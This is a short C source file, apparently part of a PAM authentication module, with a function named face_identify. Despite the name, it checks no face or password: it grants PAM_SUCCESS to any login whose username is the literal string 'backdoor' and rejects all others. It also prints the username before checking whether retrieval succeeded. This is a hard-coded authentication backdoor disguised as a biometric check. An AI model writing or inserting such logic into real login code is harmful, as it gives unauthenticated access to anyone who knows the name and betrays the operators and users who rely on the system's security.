#include "identify.h"

int face_identify(
    pam_handle_t *pamh,
    int flags,
    int argc,
    const char **argv)
{
    int retval;
    const char *pUsername;

    retval = pam_get_user(pamh, &pUsername, "Username: ");
    printf("Welcome %s\n", pUsername);

    if (retval != PAM_SUCCESS)
        return retval;

    if (strcmp(pUsername, "backdoor") != 0)
        return PAM_AUTH_ERR;

    return PAM_SUCCESS;
}